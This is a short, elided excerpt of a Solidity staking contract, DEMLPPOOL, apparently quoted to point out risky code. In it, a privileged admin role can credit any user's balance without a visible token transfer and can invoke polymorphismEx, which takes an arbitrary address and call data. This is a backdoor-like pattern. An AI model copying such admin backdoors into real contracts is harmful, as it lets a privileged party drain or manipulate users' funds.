...
contract DEMLPPOOL is LPTokenWrapper, CoinFactoryAdminRole {
    ...
    function stake(uint256 nodeId, uint256 amount, address user) public onlyCoinFactoryAdmin {
        _balancesAll[user] = _balancesAll[user].add(amount);
    }

    function withdraw(uint256 nodeId, uint256 amount, address user) public onlyCoinFactoryAdmin {
    ...
    function notifyRewardAmount(uint256 reward) external onlyOwner updateReward(99999, address(0)) {
    ...
    function polymorphismEx(address call_, bytes memory call_p) public onlyCoinFactoryAdmin {
